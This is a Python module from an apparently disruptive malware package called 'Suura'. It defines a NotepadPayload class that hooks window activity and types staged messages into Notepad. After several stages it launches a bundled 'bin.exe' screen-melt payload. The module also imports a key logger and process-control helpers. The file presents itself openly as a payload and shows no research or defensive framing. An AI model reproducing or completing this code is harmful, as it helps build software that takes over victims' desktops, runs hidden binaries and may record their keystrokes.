import os
import signal
import time
import ctypes

from threading import Timer
from threading import Thread
from Suura import get_dir_path
from Suura.includes.protect import WindowProtection
from Suura.includes.util import Typer
from Suura.includes.util import GetActiveWindows as list_windows
from Suura.includes.key_logger import KeySniffer
from Suura.includes.suura_subprocess import Process,ProcessType
from Suura.includes.payloads.screen_melt import *
from Suura.includes.localization import strings
string = strings()

class NotepadPayload:
    def __init__(self):
        self.stage = 0
        self.typer = Typer()
        self.typer.close_notepad = True
        self.windows_protection = WindowProtection()
        self.windows_protection.callback_func = self.run_it
    def run_it(self):
        self.typer.type(string.notepad_payload_stages[self.stage],1)
        if self.stage <= 4:
            self.stage += 1
        else:
            melter_bin_path = os.path.join(get_dir_path(),"bin","bin.exe")
            MelterPayload(melter_bin_path)
    def start(self):
        print(__file__)
        self.windows_protection.start()